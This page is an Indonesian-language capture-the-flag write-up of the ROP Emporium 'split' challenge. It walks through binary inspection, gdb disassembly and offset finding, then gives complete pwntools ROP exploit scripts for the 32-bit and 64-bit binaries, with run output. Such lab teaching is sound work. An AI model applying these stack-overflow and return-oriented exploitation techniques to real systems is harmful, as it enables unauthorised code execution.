<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Writeup ROP Emporium Split [pwn] | ahm4ddm</title><meta name=keywords content="writeups,rop,stack-overflow,64bit,32bit"><meta name=description content="Daftar Isi Download     ret2split32 klik   ret2split64 klik        ret2split32 Kita cek terlebih dahulu informasi file
didapatkan file ELF dan dynamically linked.
$file split32 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode."><meta name=author content><link rel=canonical href=https://ahm4ddm.github.io/posts/writeup-rope-split/><link href=/assets/css/stylesheet.min.23ca66c33946ea0cee2c04d1168bf7a5e397fb03f9bcd6cc11a233ae8e51b097.css integrity="sha256-I8pmwzlG6gzuLATRFov3peOX+wP5vNbMEaIzro5RsJc=" rel="preload stylesheet" as=style><link rel=icon href=https://ahm4ddm.github.io/fav.ico><link rel=icon type=image/png sizes=16x16 href=https://ahm4ddm.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ahm4ddm.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://ahm4ddm.github.io/apple-touch-icon.png><link rel=mask-icon href=https://ahm4ddm.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.80.0"><meta property="og:title" content="Writeup ROP Emporium Split [pwn]"><meta property="og:description" content="Daftar Isi Download     ret2split32 klik   ret2split64 klik        ret2split32 Kita cek terlebih dahulu informasi file
didapatkan file ELF dan dynamically linked.
$file split32 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode."><meta property="og:type" content="article"><meta property="og:url" content="https://ahm4ddm.github.io/posts/writeup-rope-split/"><meta property="article:published_time" content="2021-02-11T23:48:14+07:00"><meta property="article:modified_time" content="2021-02-11T23:48:14+07:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Writeup ROP Emporium Split [pwn]"><meta name=twitter:description content="Daftar Isi Download     ret2split32 klik   ret2split64 klik        ret2split32 Kita cek terlebih dahulu informasi file
didapatkan file ELF dan dynamically linked.
$file split32 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Writeup ROP Emporium Split [pwn]","name":"Writeup ROP Emporium Split [pwn]","description":"Daftar Isi Download     ret2split32 klik   ret2split64 klik        ret2split32 Kita cek terlebih dahulu informasi file\ndidapatkan file ELF dan dynamically linked.\n$file split32 …","keywords":["writeups","rop","stack-overflow","64bit","32bit"],"articleBody":"   Daftar Isi Download     ret2split32 klik   ret2split64 klik        ret2split32 Kita cek terlebih dahulu informasi file\ndidapatkan file ELF dan dynamically linked.\n$file split32 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n$checksec split32 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) kita cek semua fungsi menggunakan gdb.\ngdb-peda$ info functions All defined functions: Non-debugging symbols: ... ... ... 0x080484d0 register_tm_clones 0x08048510 __do_global_dtors_aux 0x08048540 frame_dummy 0x08048546 main 0x080485ad pwnme 0x0804860c usefulFunction 0x08048630 __libc_csu_init 0x08048690 __libc_csu_fini 0x08048694 _fini kita lakukan disassembly fungsi main\ngdb-peda$ pdisas main Dump of assembler code for function main: ... ... ... 0x08048583 :\tcall 0x80483d0  0x08048588 :\tadd esp,0x10 0x0804858b :\tcall 0x80485ad  ... ... ... Pada fungsi main hanya memanggil fungsi pwnme.\nkita disassembly fungsi pwnme\ngdb-peda$ pdisas pwnme Dump of assembler code for function pwnme: ... ... ... 0x080485ee :\tpush eax 0x080485ef :\tpush 0x0 0x080485f1 :\tcall 0x80483b0  0x080485f6 :\tadd esp,0x10 0x080485f9 :\tsub esp,0xc ... ... ... Pada fungsi pwnme terdapat kerentanan read dimana tidak ada Null Byte pada saat input berakhir.\nTidak ada pemanggilan fungsi usefulFunction pada binary.\nkita cek disassembly fungsi usefulFunction ternyata ada pemanggilan system\ngdb-peda$ pdisas usefulFunction Dump of assembler code for function usefulFunction: 0x0804860c :\tpush ebp 0x0804860d :\tmov ebp,esp 0x0804860f :\tsub esp,0x8 0x08048612 :\tsub esp,0xc 0x08048615 :\tpush 0x804870e 0x0804861a :\tcall 0x80483e0  0x0804861f :\tadd esp,0x10 0x08048622 :\tnop 0x08048623 :\tleave 0x08048624 :\tret End of assembler dump. Permasalahannya yaitu fungsi ini tidak memanggil system(cat flag.txt) melainkan memanggil system(/bin/ls)\nPada challenge ini kita masih bisa memanggil /bin/cat flag.txt\nDon't just take my word for it, let's check the call to system() and that useful string are actually here. Ingat argumen dari fungsi yang dijalankan pada arsitektur 32-bit disimpan pada stack.\nsetelah kita memanggil fungsi system yang benar\nlalu kita panggil /bin/cat flag.txt\nsystem() returns after the command has been completed. Kita cari dulu offset ke EIP\nRegisters contain pattern buffer: ECX+52 found at offset: 69 EDX+52 found at offset: 69 EBP+0 found at offset: 40 EIP+0 found at offset: 44 Registers point to pattern buffer: [ESP] -- offset 48 - size ~114 Pattern buffer not found in memory Reference to pattern buffer not found in memory didapatkan 44\nKita buat kode exploit\nfrom pwn import * p = ELF('./split32') r = process('./split32') sys = p.plt['system'] magic = next(p.search(b'/bin/cat flag.txt\\x00')) log.info('system 0x%x' %sys) log.info('magic 0x%x' %magic) junk = b'X'*44 payload = junk payload += p32(sys) payload += b'Y'*4 payload += p32(magic) r.sendline(payload) r.interactive() $python3 sol.py split by ROP Emporium x86 Contriving a reason to ask user for data...  Thank you! ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $ ret2split64 Kita cek terlebih dahulu informasi file\ndidapatkan file ELF dan dynamically linked.\n$file split split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n$checksec split Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Setelah dilakukan pengecekan dengan gdb, semua fungsi sama.\nlangsung saja ke proses exploit.\nSebelum itu, ingat argumen dari fungsi yang dijalankan pada arsitektur 64-bit disimpan pada register RDI, RSI, RDX,RCX, R8, R9\nPertama kita cari offset terlebih dahulu\nRegisters contain pattern buffer: RBP+0 found at offset: 32 Registers point to pattern buffer: [RSP] -- offset 40 - size ~56 Pattern buffer found at: 0x00007fffffffdf30 : offset 0 - size 96 ($sp + -0x28 [-10 dwords]) References to pattern buffer found at: 0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords]) 0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords]) 0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords]) Didapatkan 40.\nKita buat kode exploit\nfrom pwn import * p = ELF('./split') r = process('./split') rop = ROP('./split') sys = p.plt['system'] magic = next(p.search(b'/bin/cat flag.txt')) popret = rop.find_gadget(['pop rdi', 'ret'])[0] log.info('system 0x%x' %sys) log.info('magic 0x%x' %magic) junk = b'X'*40 payload = junk payload += p64(popret) payload += p64(magic) payload += p64(sys) r.sendline(payload) r.interactive() $python3 sol.py Contriving a reason to ask user for data...  Thank you! ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $ ","wordCount":"747","inLanguage":"en","datePublished":"2021-02-11T23:48:14+07:00","dateModified":"2021-02-11T23:48:14+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ahm4ddm.github.io/posts/writeup-rope-split/"},"publisher":{"@type":"Organization","name":"ahm4ddm","logo":{"@type":"ImageObject","url":"https://ahm4ddm.github.io/fav.ico"}}}</script></head><body id=top><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><noscript><style type=text/css>.theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://ahm4ddm.github.io accesskey=h title="ahm4ddm (Alt + H)"><img src=/home.png alt=logo aria-label=logo height=30px>ahm4ddm</a>
<span class=logo-switches><a id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://ahm4ddm.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://ahm4ddm.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://ahm4ddm.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://ahm4ddm.github.io/archives/ title=archives><span>archives</span></a></li><li><a href=https://ahm4ddm.github.io/about/ title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Writeup ROP Emporium Split [pwn]</h1><div class=post-meta>February 11, 2021&nbsp;·&nbsp;4 min</div></header><div class=post-content><table><thead><tr><th>Daftar Isi</th><th>Download</th></tr></thead><tbody><tr><td><a href=#ret2split32>ret2split32</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/64/ret2win/ret2win>klik</a></td></tr><tr><td><a href=#ret2split64>ret2split64</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/32/ret2win32/ret2win32>klik</a></td></tr><tr><td></td><td></td></tr></tbody></table><h3 id=ret2split32>ret2split32<a hidden class=anchor aria-hidden=true href=#ret2split32>#</a></h3><p>Kita cek terlebih dahulu informasi file<br>didapatkan file ELF dan dynamically linked.</p><pre><code>$file split32
split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped
</code></pre><p>lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop).</p><pre><code>$checksec split32
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p>kita cek semua fungsi menggunakan gdb.</p><pre><code>gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
...
...
...
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804860c  usefulFunction
0x08048630  __libc_csu_init
0x08048690  __libc_csu_fini
0x08048694  _fini
</code></pre><p>kita lakukan disassembly fungsi <em><strong>main</strong></em></p><pre><code>gdb-peda$ pdisas main
Dump of assembler code for function main:
...
...
...
0x08048583 &lt;+61&gt;:	call   0x80483d0 &lt;puts@plt&gt;
0x08048588 &lt;+66&gt;:	add    esp,0x10
0x0804858b &lt;+69&gt;:	call   0x80485ad &lt;pwnme&gt;
...
...
...
</code></pre><p>Pada fungsi main hanya memanggil fungsi <em><strong>pwnme</strong></em>.<br>kita disassembly fungsi <em><strong>pwnme</strong></em></p><pre><code>gdb-peda$ pdisas pwnme
Dump of assembler code for function pwnme:
...
...
...
   0x080485ee &lt;+65&gt;:	push   eax
   0x080485ef &lt;+66&gt;:	push   0x0
   0x080485f1 &lt;+68&gt;:	call   0x80483b0 &lt;read@plt&gt;
   0x080485f6 &lt;+73&gt;:	add    esp,0x10
   0x080485f9 &lt;+76&gt;:	sub    esp,0xc
...
...
...
</code></pre><p>Pada fungsi <em><strong>pwnme</strong></em> terdapat kerentanan <em><strong>read</strong></em> dimana tidak ada Null Byte pada saat input berakhir.<br>Tidak ada pemanggilan fungsi <em><strong>usefulFunction</strong></em> pada binary.<br>kita cek disassembly fungsi <em><strong>usefulFunction</strong></em>
ternyata ada pemanggilan <em><strong>system</strong></em></p><pre><code>gdb-peda$ pdisas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804860c &lt;+0&gt;:	push   ebp
   0x0804860d &lt;+1&gt;:	mov    ebp,esp
   0x0804860f &lt;+3&gt;:	sub    esp,0x8
   0x08048612 &lt;+6&gt;:	sub    esp,0xc
   0x08048615 &lt;+9&gt;:	push   0x804870e
   0x0804861a &lt;+14&gt;:	call   0x80483e0 &lt;system@plt&gt;
   0x0804861f &lt;+19&gt;:	add    esp,0x10
   0x08048622 &lt;+22&gt;:	nop
   0x08048623 &lt;+23&gt;:	leave  
   0x08048624 &lt;+24&gt;:	ret    
End of assembler dump.
</code></pre><p>Permasalahannya yaitu fungsi ini tidak memanggil <em><strong>system(cat flag.txt)</strong></em> melainkan memanggil <em><strong>system(/bin/ls)</strong></em><br>Pada challenge ini kita masih bisa memanggil <em><strong>/bin/cat flag.txt</strong></em></p><pre><code>Don't just take my word for it, let's check the call to system() and that useful string are actually here.
</code></pre><p>Ingat argumen dari fungsi yang dijalankan pada arsitektur 32-bit disimpan pada stack.<br>setelah kita memanggil fungsi <em><strong>system yang benar</strong></em><br>lalu kita panggil <em><strong>/bin/cat flag.txt</strong></em></p><pre><code>system() returns after the command has been completed.
</code></pre><p>Kita cari dulu offset ke <em><strong>EIP</strong></em></p><pre><code>Registers contain pattern buffer:
ECX+52 found at offset: 69
EDX+52 found at offset: 69
EBP+0 found at offset: 40
EIP+0 found at offset: 44
Registers point to pattern buffer:
[ESP] --&gt; offset 48 - size ~114
Pattern buffer not found in memory
Reference to pattern buffer not found in memory
</code></pre><p>didapatkan 44</p><p>Kita buat kode exploit</p><pre><code>from pwn import *

p = ELF('./split32')
r = process('./split32')

sys = p.plt['system']
magic = next(p.search(b'/bin/cat flag.txt\x00'))
log.info('system 0x%x' %sys)
log.info('magic 0x%x' %magic)
junk = b'X'*44
payload = junk
payload += p32(sys)
payload += b'Y'*4
payload += p32(magic)
r.sendline(payload)
r.interactive()
</code></pre><pre><code>$python3 sol.py
split by ROP Emporium
x86

Contriving a reason to ask user for data...
&gt; Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
</code></pre><h3 id=ret2split64>ret2split64<a hidden class=anchor aria-hidden=true href=#ret2split64>#</a></h3><p>Kita cek terlebih dahulu informasi file<br>didapatkan file ELF dan dynamically linked.</p><pre><code>$file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
</code></pre><p>lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop).</p><pre><code>$checksec split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Setelah dilakukan pengecekan dengan gdb, semua fungsi sama.<br>langsung saja ke proses exploit.<br>Sebelum itu, ingat argumen dari fungsi yang dijalankan pada arsitektur 64-bit disimpan pada register <a href=https://ctf101.org/binary-exploitation/what-are-calling-conventions/>RDI, RSI, RDX,RCX, R8, R9</a><br>Pertama kita cari offset terlebih dahulu</p><pre><code>Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --&gt; offset 40 - size ~56
Pattern buffer found at:
0x00007fffffffdf30 : offset    0 - size   96 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords])
0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords])
0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords])
</code></pre><p>Didapatkan 40.<br>Kita buat kode exploit</p><pre><code>from pwn import *

p = ELF('./split')
r = process('./split')
rop = ROP('./split')

sys = p.plt['system']
magic = next(p.search(b'/bin/cat flag.txt'))
popret = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info('system 0x%x' %sys)
log.info('magic 0x%x' %magic)

junk = b'X'*40
payload = junk
payload += p64(popret)
payload += p64(magic)
payload += p64(sys)

r.sendline(payload)
r.interactive()
</code></pre><pre><code>$python3 sol.py
Contriving a reason to ask user for data...
&gt; Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://ahm4ddm.github.io/tags/writeups/>writeups</a></li><li><a href=https://ahm4ddm.github.io/tags/rop/>rop</a></li><li><a href=https://ahm4ddm.github.io/tags/stack-overflow/>stack-overflow</a></li><li><a href=https://ahm4ddm.github.io/tags/64bit/>64bit</a></li><li><a href=https://ahm4ddm.github.io/tags/32bit/>32bit</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://ahm4ddm.github.io>ahm4ddm</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
<span>&#183;</span>
<span>Theme <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script defer src=/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w=" onload=hljs.initHighlightingOnLoad();></script><script>window.onload=function(){if(localStorage.getItem("menu-scroll-position")){document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position");}}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches){document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:"smooth"});}else{document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();}
if(id==="top"){history.replaceState(null,null," ");}else{history.pushState(null,null,`#${id}`);}});});var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft);}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script></body></html>